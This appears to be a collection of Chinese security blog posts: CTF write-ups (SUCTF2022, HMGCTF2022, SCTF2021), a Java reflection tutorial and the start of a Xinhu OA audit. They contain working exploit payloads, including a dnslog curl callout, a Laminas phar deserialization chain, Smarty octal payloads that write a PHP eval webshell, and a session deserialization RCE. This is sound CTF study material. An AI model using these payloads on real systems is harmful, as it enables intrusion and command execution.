./tmp/log.txt\u0026#34;.format(time.strftime(\u0026#34;%Y%m%d-%H%M%S\u0026#34;,time.localtime()),ip,num) if waf(num): try: data = eval(num) os.system(log) except: pass return str(data) else: return \u0026#34;waf!!\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=5000)   这里就是传了一个num参数进去，这里如果参数通过了waf，那么就会计算结果，并且system函数执行log，猜测这里是通过注入一些危险的命令去执行 这里有一个waf，过滤了很多东西\n1  blacklist = [\u0026#39;import\u0026#39;,\u0026#39;(\u0026#39;,\u0026#39;)\u0026#39;,\u0026#39; \u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;;\u0026#39;,\u0026#39;\u0026#34;\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;getattr\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;class\u0026#39;,\u0026#39;subclasses\u0026#39;,\u0026#39;mro\u0026#39;,\u0026#39;request\u0026#39;,\u0026#39;args\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;if\u0026#39;,\u0026#39;subprocess\u0026#39;,\u0026#39;file\u0026#39;,\u0026#39;open\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;builtins\u0026#39;,\u0026#39;compile\u0026#39;,\u0026#39;execfile\u0026#39;,\u0026#39;from_pyfile\u0026#39;,\u0026#39;config\u0026#39;,\u0026#39;local\u0026#39;,\u0026#39;self\u0026#39;,\u0026#39;item\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;getattribute\u0026#39;,\u0026#39;func_globals\u0026#39;,\u0026#39;__init__\u0026#39;,\u0026#39;join\u0026#39;,\u0026#39;__dict__\u0026#39;]   但是由于命令执行没有回显，所以用dnslog，这样操作可以绕过 空格用%09代替 直接注入代码会报错，因为num代码会走进eval造成报错，所以需要加一个#作为注释符来绕过\n1  1%23%60curl%09zeej2v.dnslog.cn%60   可以成功执行命令\n试着反弹shell，直接执行弹shell不行，很多被过滤了，所以我们利用wget去传命令上去执行\n","date":"2022-03-28T18:35:14+08:00","permalink":"https://example.com/post/suctf2022/","title":"[SUCTF2022] WP"},{"content":"WEB Fan website 首先是一个www.zip的源码泄露，是laminas框架 mvc的框架首先就是看路由 在\\module\\Album\\src\\Controller\\AlbumController.php里面有功能点\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175  \u0026lt;?php namespace Album\\Controller; use Album\\Model\\AlbumTable; use Laminas\\Mvc\\Controller\\AbstractActionController; use Laminas\\View\\Model\\ViewModel; use Album\\Form\\AlbumForm; use Album\\Form\\UploadForm; use Album\\Model\\Album; class AlbumController extends AbstractActionController { // Add this property:  private $table; private $white_list; public function __construct(AlbumTable $table){ $this-\u0026gt;table = $table; $this-\u0026gt;white_list = array(\u0026#39;.jpg\u0026#39;,\u0026#39;.jpeg\u0026#39;,\u0026#39;.png\u0026#39;); } public function indexAction() { return new ViewModel([ \u0026#39;albums\u0026#39; =\u0026gt; $this-\u0026gt;table-\u0026gt;fetchAll(), ]); } public function addAction() { $form = new AlbumForm(); $form-\u0026gt;get(\u0026#39;submit\u0026#39;)-\u0026gt;setValue(\u0026#39;Add\u0026#39;); $request = $this-\u0026gt;getRequest(); if (! $request-\u0026gt;isPost()) { return [\u0026#39;form\u0026#39; =\u0026gt; $form]; } $album = new Album(); $form-\u0026gt;setInputFilter($album-\u0026gt;getInputFilter()); $form-\u0026gt;setData($request-\u0026gt;getPost()); if (! $form-\u0026gt;isValid()) { return [\u0026#39;form\u0026#39; =\u0026gt; $form]; } $album-\u0026gt;exchangeArray($form-\u0026gt;getData()); $this-\u0026gt;table-\u0026gt;saveAlbum($album); return $this-\u0026gt;redirect()-\u0026gt;toRoute(\u0026#39;album\u0026#39;); } public function editAction() { $id = (int) $this-\u0026gt;params()-\u0026gt;fromRoute(\u0026#39;id\u0026#39;, 0); if (0 === $id) { return $this-\u0026gt;redirect()-\u0026gt;toRoute(\u0026#39;album\u0026#39;, [\u0026#39;action\u0026#39; =\u0026gt; \u0026#39;add\u0026#39;]); } // Retrieve the album with the specified id. Doing so raises  // an exception if the album is not found, which should result  // in redirecting to the landing page.  try { $album = $this-\u0026gt;table-\u0026gt;getAlbum($id); } catch (\\Exception $e) { return $this-\u0026gt;redirect()-\u0026gt;toRoute(\u0026#39;album\u0026#39;, [\u0026#39;action\u0026#39; =\u0026gt; \u0026#39;index\u0026#39;]); } $form = new AlbumForm(); $form-\u0026gt;bind($album); $form-\u0026gt;get(\u0026#39;submit\u0026#39;)-\u0026gt;setAttribute(\u0026#39;value\u0026#39;, \u0026#39;Edit\u0026#39;); $request = $this-\u0026gt;getRequest(); $viewData = [\u0026#39;id\u0026#39; =\u0026gt; $id, \u0026#39;form\u0026#39; =\u0026gt; $form]; if (! $request-\u0026gt;isPost()) { return $viewData; } $form-\u0026gt;setInputFilter($album-\u0026gt;getInputFilter()); $form-\u0026gt;setData($request-\u0026gt;getPost()); if (! $form-\u0026gt;isValid()) { return $viewData; } $this-\u0026gt;table-\u0026gt;saveAlbum($album); // Redirect to album list  return $this-\u0026gt;redirect()-\u0026gt;toRoute(\u0026#39;album\u0026#39;, [\u0026#39;action\u0026#39; =\u0026gt; \u0026#39;index\u0026#39;]); } public function deleteAction() { $id = (int) $this-\u0026gt;params()-\u0026gt;fromRoute(\u0026#39;id\u0026#39;, 0); if (!$id) { return $this-\u0026gt;redirect()-\u0026gt;toRoute(\u0026#39;album\u0026#39;); } $request = $this-\u0026gt;getRequest(); if ($request-\u0026gt;isPost()) { $del = $request-\u0026gt;getPost(\u0026#39;del\u0026#39;, \u0026#39;No\u0026#39;); if ($del == \u0026#39;Yes\u0026#39;) { $id = (int) $request-\u0026gt;getPost(\u0026#39;id\u0026#39;); $this-\u0026gt;table-\u0026gt;deleteAlbum($id); } // Redirect to list of albums  return $this-\u0026gt;redirect()-\u0026gt;toRoute(\u0026#39;album\u0026#39;); } return [ \u0026#39;id\u0026#39; =\u0026gt; $id, \u0026#39;album\u0026#39; =\u0026gt; $this-\u0026gt;table-\u0026gt;getAlbum($id), ]; } public function imgdeleteAction() { $request = $this-\u0026gt;getRequest(); if(isset($request-\u0026gt;getPost()[\u0026#39;imgpath\u0026#39;])){ $imgpath = $request-\u0026gt;getPost()[\u0026#39;imgpath\u0026#39;]; $base = substr($imgpath,-4,4); if(in_array($base,$this-\u0026gt;white_list)){ //白名单  @unlink($imgpath); }else{ echo \u0026#39;Only Img File Can Be Deleted!\u0026#39;; } } } public function imguploadAction() { $form = new UploadForm(\u0026#39;upload-form\u0026#39;); $request = $this-\u0026gt;getRequest(); if ($request-\u0026gt;isPost()) { // Make certain to merge the $_FILES info!  $post = array_merge_recursive( $request-\u0026gt;getPost()-\u0026gt;toArray(), $request-\u0026gt;getFiles()-\u0026gt;toArray() ); $form-\u0026gt;setData($post); if ($form-\u0026gt;isValid()) { $data = $form-\u0026gt;getData(); $base = substr($data[\u0026#34;image-file\u0026#34;][\u0026#34;name\u0026#34;],-4,4); if(in_array($base,$this-\u0026gt;white_list)){ //白名单限制  $cont = file_get_contents($data[\u0026#34;image-file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); if (preg_match(\u0026#34;/\u0026lt;\\?|php|HALT\\_COMPILER/i\u0026#34;, $cont )) { die(\u0026#34;Not This\u0026#34;); } if($data[\u0026#34;image-file\u0026#34;][\u0026#34;size\u0026#34;]\u0026lt;3000){ die(\u0026#34;The picture size must be more than 3kb\u0026#34;); } $img_path = realpath(getcwd()).\u0026#39;/public/img/\u0026#39;.md5($data[\u0026#34;image-file\u0026#34;][\u0026#34;name\u0026#34;]).$base; echo $img_path; $form-\u0026gt;saveImg($data[\u0026#34;image-file\u0026#34;][\u0026#34;tmp_name\u0026#34;],$img_path); }else{ echo \u0026#39;Only Img Can Be Uploaded!\u0026#39;; } // Form is valid, save the form!  //return $this-\u0026gt;redirect()-\u0026gt;toRoute(\u0026#39;upload-form/success\u0026#39;);  } } return [\u0026#39;form\u0026#39; =\u0026gt; $form]; } }   首先是很明显是一个文件上传\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  public function imguploadAction() { $form = new UploadForm(\u0026#39;upload-form\u0026#39;); $request = $this-\u0026gt;getRequest(); if ($request-\u0026gt;isPost()) { // Make certain to merge the $_FILES info!  $post = array_merge_recursive( $request-\u0026gt;getPost()-\u0026gt;toArray(), $request-\u0026gt;getFiles()-\u0026gt;toArray() ); $form-\u0026gt;setData($post); if ($form-\u0026gt;isValid()) { $data = $form-\u0026gt;getData(); $base = substr($data[\u0026#34;image-file\u0026#34;][\u0026#34;name\u0026#34;],-4,4); if(in_array($base,$this-\u0026gt;white_list)){ //白名单限制  $cont = file_get_contents($data[\u0026#34;image-file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); if (preg_match(\u0026#34;/\u0026lt;\\?|php|HALT\\_COMPILER/i\u0026#34;, $cont )) { die(\u0026#34;Not This\u0026#34;); } if($data[\u0026#34;image-file\u0026#34;][\u0026#34;size\u0026#34;]\u0026lt;3000){ die(\u0026#34;The picture size must be more than 3kb\u0026#34;); } $img_path = realpath(getcwd()).\u0026#39;/public/img/\u0026#39;.md5($data[\u0026#34;image-file\u0026#34;][\u0026#34;name\u0026#34;]).$base; echo $img_path; $form-\u0026gt;saveImg($data[\u0026#34;image-file\u0026#34;][\u0026#34;tmp_name\u0026#34;],$img_path); }else{ echo \u0026#39;Only Img Can Be Uploaded!\u0026#39;; } // Form is valid, save the form!  //return $this-\u0026gt;redirect()-\u0026gt;toRoute(\u0026#39;upload-form/success\u0026#39;);  } } return [\u0026#39;form\u0026#39; =\u0026gt; $form]; }   首先有一个白名单限制，只能传图片后缀，再者这里有一个phar文件的识别 这里就属于此地无银三百两了\n1  (\u0026#34;/\u0026lt;\\?|php|HALT\\_COMPILER/i\u0026#34;,   找phar的利用点，在imgdeleteAction里面有@unlink($imgpath);，可以触发phar\n1 2 3 4 5 6 7 8 9 10 11 12 13  public function imgdeleteAction() { $request = $this-\u0026gt;getRequest(); if(isset($request-\u0026gt;getPost()[\u0026#39;imgpath\u0026#39;])){ $imgpath = $request-\u0026gt;getPost()[\u0026#39;imgpath\u0026#39;]; $base = substr($imgpath,-4,4); if(in_array($base,$this-\u0026gt;white_list)){ //白名单  @unlink($imgpath); }else{ echo \u0026#39;Only Img File Can Be Deleted!\u0026#39;; } } }   那么就好做了，首先去找链子 如下链子可以rce，直接构造phar文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  \u0026lt;?php namespace Laminas\\View\\Resolver{ class TemplateMapResolver{ protected $map = [\u0026#34;setBody\u0026#34;=\u0026gt;\u0026#34;system\u0026#34;]; } } namespace Laminas\\View\\Renderer{ class PhpRenderer{ private $__helpers; function __construct(){ $this-\u0026gt;__helpers = new \\Laminas\\View\\Resolver\\TemplateMapResolver(); } } } namespace Laminas\\Log\\Writer{ abstract class AbstractWriter{} class Mail extends AbstractWriter{ protected $eventsToMail = [\u0026#34;cat /flag\u0026#34;]; protected $subjectPrependText = null; protected $mail; function __construct(){ $this-\u0026gt;mail = new \\Laminas\\View\\Renderer\\PhpRenderer(); } } } namespace Laminas\\Log{ class Logger{ protected $writers; function __construct(){ $this-\u0026gt;writers = [new \\Laminas\\Log\\Writer\\Mail()]; } } } namespace{ $a = new \\Laminas\\Log\\Logger(); @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); }   由于他会对phar文件的特征进行识别，所以我们需要加以绕过，这里有两个绕过方法，我直接把phar文件进行gzip压缩，这样就没有特征了\n然后修改后缀为png，在/album/imgupload里上传上去\n他说文件太小，必须要大于3kb\n1 2 3  if($data[\u0026#34;image-file\u0026#34;][\u0026#34;size\u0026#34;]\u0026lt;3000){ die(\u0026#34;The picture size must be more than 3kb\u0026#34;); }   那么就直接在后面加数据就可以了\n然后上传上去，返回图片的路径\n在到/album/imgdelete里面用unlink去触发phar\n成功拿到flag\nSmarty calculator 也是开局有一个www.zip的源码泄露，是Smarty模板引擎，看了一下版本是3.1.39\n那么他说自己修改了这个模板，那么我们下载到源文件去比较一下\n重点在这个文件：smarty_internal_compile_function.php 他修改了正则过滤\n再看漏洞，网上搜了一轮，在3.1.38有一个代码注入漏洞，CVE-2021-26119和CVE-2021-26120国外有师傅分析过这个漏洞\n很明显我们应该就是得走这个方向 我对比了一下38和39的文件的修改，他的修改就是在这个文件里增加了一个正则过滤\n在我的测试下，这个payload是可以在3.1.38下打通的\n1  {function+name=\u0026#39;rce(){};system(\u0026#34;id\u0026#34;);function+\u0026#39;}{/function}   打断点发现这个过滤的确会拦截，所以不能直接在3.1.39打通\n1  preg_match(\u0026#39;/[a-zA-Z0-9_\\x80-\\xff](.*)+$/\u0026#39;, $_name)   赛后复现，发现可以从math这里入手\n在function_math.php里面，有eval可以执行命令，但是这里有一个过滤\n这个过滤如果没过去，那么就会进入到error出去\n这个可以用八进制去绕过\n可以看到生成了模板缓存文件，将执行的命令结果输出\npayload：\n1  data={$poc=\u0026#34;poc\u0026#34;}{math equation=\u0026#34;(\\\u0026#34;\\\\163\\\\171\\\\163\\\\164\\\\145\\\\155\\\u0026#34;)(\\\u0026#34;\\\\167\\\\150\\\\157\\\\141\\\\155\\\\151\\\u0026#34;)\u0026#34;}   拿flag写个马就行了\n1  file_put_contents(\u0026#34;1.php\u0026#34;,\u0026#34;\u0026lt;?php eval($_POST[\u0026#39;a\u0026#39;]);?\u0026gt;\u0026#34;)   转一下得到\n1  eval:{$poc=\u0026#34;poc\u0026#34;}{math equation=\u0026#34;(\\\u0026#34;\\\\146\\\\151\\\\154\\\\145\\\\137\\\\160\\\\165\\\\164\\\\137\\\\143\\\\157\\\\156\\\\164\\\\145\\\\156\\\\164\\\\163\\\u0026#34;)(\\\u0026#34;\\\\31\\\\2e\\\\70\\\\68\\\\70\\\u0026#34;,\\\u0026#34;\\\\74\\\\77\\\\160\\\\150\\\\160\\\\40\\\\145\\\\166\\\\141\\\\154\\\\50\\\\44\\\\137\\\\120\\\\117\\\\123\\\\124\\\\133\\\\47\\\\141\\\\47\\\\135\\\\51\\\\73\\\\77\\\\76\\\u0026#34;)\u0026#34;}   但是这个就很奇怪，这样执行命令的话就不会经过他所修改的正则的方法里面，这是算一个非预期解吗\nMisc MissingFile 直接文本搜索都有flag了\n重要系统（复现） 有键盘流量\n连接上ssh后，不需要提权能直接grep到flag。。。\n","date":"2022-03-24T18:46:53+08:00","permalink":"https://example.com/post/hmgctf2022/","title":"[HMGCTF2022] WP"},{"content":"前言 准备入手学习java的安全了，感觉这也是一个大的趋势，想着尽早进入到java安全的探索中，在反序列化链的学习之前，需要先学习反射，不多说了，开干吧\n反射 反射定义 对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有） 通过java语言中的反射机制可以操作字节码文件，可以读和修改字节码文件\n反射的基本运用 1. 获取类 a. forName()方法 只需要知道类名，在加载JDBC的时候会采用 实例代码\n1 2 3 4 5 6  public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class name = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); System.out.println(name); } }   b. 直接获取 使用.class去获取对象\n1 2 3 4 5 6  public class test1 { public static void main(String[] args) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; name = Runtime.class; System.out.println(name); } }   c. getClass()方法 obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类\n1 2 3 4 5 6 7 8  public class test1 { public static void main(String[] args) throws ClassNotFoundException { Runtime rt = Runtime.getRuntime(); Class\u0026lt;?\u0026gt; name = rt.getClass(); System.out.println(name); } }   d. getSystemClassLoader().loadClass()方法 这个方法和forName类似，只要有类名就可以了，但是区别在于，forName的静态JVM会装载类，并执行static()中的代码\n1 2 3 4 5 6  public class getSystemClassLoader { public static void main(String[] args) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; name = ClassLoader.getSystemClassLoader().loadClass(\u0026#34;java.lang.Runtime\u0026#34;); System.out.println(name); } }   2. 获取类方法 a. getDeclaredMethods 返回类或接口声明的所有方法，包括public、protected、private和默认方法，但是不包括继承的方法\n1 2 3 4 5 6 7 8 9 10 11  import java.lang.reflect.Method; public class getDeclaredMethods { public static void main(String[] args) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; name = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); System.out.println(name); Method[] m = name.getDeclaredMethods(); for(Method x:m) System.out.println(x); } }   b. getDeclaredMethod 获取特定的方法，第一个参数是方法名，第二个参数是该方法的参数对应的class对象，例如这里Runtime的exec方法参数为一个String，所以这里的第二个参数是String.class\n1 2 3 4 5 6 7 8 9  import java.lang.reflect.Method; public class getDeclaredMethod { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException { Class\u0026lt;?\u0026gt; name = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method m = name.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); System.out.println(m); } }   c. getMethods 返回某个类所有的public方法，包括继承类的public方法\nd. getMethod 参数同理getDeclaredMethod\n3. 获取成员变量 同理Method的那几个方法\na. getDeclaredFields 获取类的成员的所有变量数组，但是不包括父类的\nb. getDeclaredField(String name) 获取特定的，参数是想要的方法的名称\nc. getFields() 同理，只能获得public的，但是包括了父类的\nd. getField(String name) 同理，参数是想要的方法的名称\n4. 获取构造函数Constructor 1 2 3 4 5 6 7  Constructor\u0026lt;?\u0026gt;[] getConstructors() ：只返回public构造函数 Constructor\u0026lt;?\u0026gt;[] getDeclaredConstructors() ：返回所有构造函数 Constructor\u0026lt;\u0026gt; getConstructor(类\u0026lt;?\u0026gt;... parameterTypes) : 匹配和参数配型相符的public构造函数 Constructor\u0026lt;\u0026gt; getDeclaredConstructor(类\u0026lt;?\u0026gt;... parameterTypes) ： 匹配和参数配型相符的构造函数   后面两个方法的参数是对于方法的参数的类型的class对象，和Method的那个类似，例如String.class\n5. 反射创建类对象 newInstance 可以通过反射来生成实例化对象，一般我们使用Class对象的newInstance()方法来进行创建类对象\n创建的方法就是：只需要通过forname方法获取到的class对象中进行newInstance方法创建即可\n1 2  Class c = Class.forName(\u0026#34;com.reflect.MethodTest\u0026#34;); // 创建Class对象 Object m1 = c.newInstance(); // 创建类对象   invoke invoke方法位于java.lang.reflect.Method类中，用于执行某个的对象的目标方法,一般会和getMethod方法配合进行调用。\n使用用法：\n1  public Object invoke(Object obj, Object... args)   第一个参数为类的实例，第二个参数为相应函数中的参数\nobj：从中调用底层方法的对象，必须是实例化对象 args： 用于方法的调用，是一个object的数组，参数有可能是多个\n但需要注意的是，invoke方法第一个参数并不是固定的：\n  如果调用这个方法是普通方法，第一个参数就是类对象；\n  如果调用这个方法是静态方法，第一个参数就是类；\n  通过一个例子去理解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Invoke { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Class c = Class.forName(\u0026#34;Invoke\u0026#34;); Object o = c.newInstance(); Method m = c.getMethod(\u0026#34;test\u0026#34;); m.invoke(o); } public void test(){ System.out.println(\u0026#34;测试成功\u0026#34;); } }   简单来说就是这样\n1  方法.invoke(类或类对象)   先forName拿到Class，再newInstance获取类对象，再getMethod获取方法，然后调用\nRuntime的rce例子（访问限制突破） Runtime类里面有一个exec方法，可以执行命令\n1 2 3 4 5 6 7 8 9 10 11  import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Exec { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Class c = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Object o = c.newInstance(); Method m = c.getMethod(\u0026#34;exec\u0026#34;,String.class); m.invoke(o,\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;); } }   但是发现报错了\n出现这个问题的原因：\n 使用的类没有无参构造函数 使用的类构造函数是私有的  那么解决方案就是setAccessible(true);，用这个去突破访问限制\n Java.lang.reflect.AccessibleObject类是Field，Method和Constructor类对象的基类，可以提供将反射对象标记为使用它抑制摸人Java访问控制检查的功能，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作\n 简单来说，私有的属性、方法、构造方法，可以通过这个去突破限制，xxx.setAccessible(true) 可以看到Runtime的构造方法是private的\n那么这里我们就可以这么去突破限制 先获取构造方法，然后setAccessible获取访问权限 然后再最后invoke里面，第一个参数写成con.newInstance()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Exec { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class c = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor con = c.getDeclaredConstructor(); con.setAccessible(true); Method m = c.getMethod(\u0026#34;exec\u0026#34;,String.class); m.invoke(con.newInstance(),\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;); } }   这里有一个疑问，如果把con.newInstance单独提取出来，他打开计算器不会显示出来，但是后台的确是启动了，不知道啥原因\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Exec { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class c = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor con = c.getDeclaredConstructor(); con.setAccessible(true); Object o = con.newInstance(); Method m = c.getMethod(\u0026#34;exec\u0026#34;,String.class); m.invoke(o,\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;); } }   后记 反射中常用的几个重要方法：\n 获取类的⽅法： forName 实例化类对象的⽅法： newInstance 获取函数的⽅法： getMethod 执⾏函数的⽅法： invoke 限制突破方法：setAccessible  ","date":"2022-03-07T19:14:57+08:00","permalink":"https://example.com/post/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/","title":"[Java安全]反射"},{"content":"题目地址 SycloverTeam提供了题目的docker环境 https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1\nwp 首先题目给了composer.json\n1 2 3 4 5 6 7 8 9 10 11 12 13  { \u0026#34;name\u0026#34;: \u0026#34;sctf2021/upload\u0026#34;, \u0026#34;authors\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;AFKL\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;upload@qq.com\u0026#34; } ], \u0026#34;require\u0026#34;: { \u0026#34;symfony/string\u0026#34;: \u0026#34;^5.3\u0026#34;, \u0026#34;opis/closure\u0026#34;: \u0026#34;^3.6\u0026#34; } }   导入了两个包，那就肯定是组件相关的攻击了\n1 2  \u0026#34;symfony/string\u0026#34;: \u0026#34;^5.3\u0026#34;, \u0026#34;opis/closure\u0026#34;: \u0026#34;^3.6\u0026#34;   composer update一下\n第二个组件是关于闭包反序列化的，所以猜测和序列化有关 index.php内的主要逻辑代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  if (!empty($_POST[\u0026#39;path\u0026#39;])) { $upload_file_path = $_SESSION[\u0026#34;upload_path\u0026#34;].\u0026#34;/\u0026#34;.$_POST[\u0026#39;path\u0026#39;]; $upload_file = $upload_file_path.\u0026#34;/\u0026#34;.$file[\u0026#39;name\u0026#39;]; } else { $upload_file_path = $_SESSION[\u0026#34;upload_path\u0026#34;]; $upload_file = $_SESSION[\u0026#34;upload_path\u0026#34;].\u0026#34;/\u0026#34;.$file[\u0026#39;name\u0026#39;]; } if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $upload_file)) { echo \u0026#34;OK! Your file saved in: \u0026#34; . $upload_file; } else { echo \u0026#34;emm...Upload failed:(\u0026#34;; } } else { echo \u0026#34;too big!!!\u0026#34;; }   这里会调用$_SESSION[\u0026quot;upload_path\u0026quot;]，那么考虑到session反序列化 题目测试到，上传可以进行目录穿越，但是只有tmp目录可写\n题目有给到phpinfo()，打开看一下，path没给，但是能操作的目录只有tmp，那么肯定就是/tmp/sess_xxxx了\n那么我们就是可以操控session文件了，所以我们现在的目的就是怎么去构造一个session文件去rce 可以看到index.php里面session拼接了： $_SESSION[\u0026quot;upload_path\u0026quot;].\u0026quot;/\u0026quot;.$_POST['path']; 所以如果 $_SESSION[\u0026quot;upload_path\u0026quot;]是一个对象的话，那就会触发一个__toString方法了 那么我们就去找一个可以利用的__toString方法，这里是可以利用的在LazyString这里找到利用的方法\n再看到这个组件，opis/closure，可序列化闭包，那么我们就可以通过创建一个攻击性的闭包去反序列化，这样完成我们的攻击 那么如此，我们就可以构造我们的exp了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  \u0026lt;?php namespace Symfony\\Component\\String { class LazyString { private $value; public function __construct($a){ $this-\u0026gt;value = $a; } } } namespace { include_once \u0026#34;../vendor/autoload.php\u0026#34;; $func = function() {system(\u0026#34;cat /flag\u0026#34;);}; $raw = \\Opis\\Closure\\serialize($func); $data = unserialize($raw); $exp = new \\Symfony\\Component\\String\\LazyString($data); echo urlencode(serialize($exp)); }   payload，注意%00的解码，前面拼接上upload_path|\n1  upload_path|O:35:\u0026#34;Symfony\\Component\\String\\LazyString\u0026#34;:1:{s:42:\u0026#34;%00Symfony\\Component\\String\\LazyString%00value\u0026#34;;C:32:\u0026#34;Opis\\Closure\\SerializableClosure\u0026#34;:157:{a:5:{s:3:\u0026#34;use\u0026#34;;a:0:{}s:8:\u0026#34;function\u0026#34;;s:34:\u0026#34;function() {\\system(\u0026#34;cat /flag\u0026#34;);}\u0026#34;;s:5:\u0026#34;scope\u0026#34;;N;s:4:\u0026#34;this\u0026#34;;N;s:4:\u0026#34;self\u0026#34;;s:32:\u0026#34;0000000045e636f7000000007352e912\u0026#34;;}}}   再次上传文件，利用session去拼接调用__toString方法，成功rce\n预期解 看了作者给的wp，发现预期解是通过__sleep方法去调用__toString方法的\n而php原生的session执行反序列化的时候，的确会调用__sleep方法\n思路 这道题的整个的思路就是：\n 首先测试到上传的文件可以进行目录穿越，但是只有tmp目录有权限 源码中观察到闭包反序列化组件，方向可能是反序列化，执行composer update安装源码 有session的使用，可以上传文件到tmp，而且有session的使用，而且phpinfo中有写是file，所以考虑到是session反序列化 构造闭包去序列化打rce  ","date":"2022-02-13T19:12:40+08:00","permalink":"https://example.com/post/sctf2021/","title":"[SCTF2021]Upload_it_1复现闭包组件反序列化rce"},{"content":"前言 对于这个OA的代码审计是在最近的西湖论剑比赛中出的一个web题，题目是2.3.1版本的信呼OA，在当时是最新版的（2021.11.20） 这次比赛结束打算好好审计一波\n环境搭建 此次代码审计我用的是2.3.1版本 项目地址： https://xinhu-1251238447.file.myqcloud.com/file/xinhu_utf8_v2.3.1.zip\n安装好后，修改admin的密码，成功初始化\n漏洞分析 修改任意用户密码 在安装完该OA系统后，我修改了默认密码为1234qwer\n漏洞存在于webmain/task/api/reimplatAction.php中 看到这里的代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  public function indexAction() { $body = $this-\u0026gt;getpostdata(); if(!$body)return; $db = m(\u0026#39;reimplat:dept\u0026#39;); $key = $db-\u0026gt;gethkey(); $bodystr = $this-\u0026gt;jm-\u0026gt;strunlook($body, $key); if(!$bodystr)return; $data = json_decode($bodystr, true); $msgtype = arrvalue($data,\u0026#39;msgtype\u0026#39;); $msgevent= arrvalue($data,\u0026#39;msgevent\u0026#39;); ============中间省略================================ //修改密码 \tif($msgtype==\u0026#39;editpass\u0026#39;){ $user = arrvalue($data, \u0026#39;user\u0026#39;); $pass = arrvalue($data, \u0026#39;pass\u0026#39;); if($pass \u0026amp;\u0026amp; $user){ $where = \u0026#34;`user`=\u0026#39;$user\u0026#39;\u0026#34;; $mima = md5($pass); m(\u0026#39;admin\u0026#39;)-\u0026gt;update(\u0026#34;`pass`=\u0026#39;$mima\u0026#39;,`editpass`=`editpass`+1\u0026#34;, $where); } } }   首先是getpostdata()方法获取post传入的数据 第二个点就是key，我们跟进这个getkey()方法 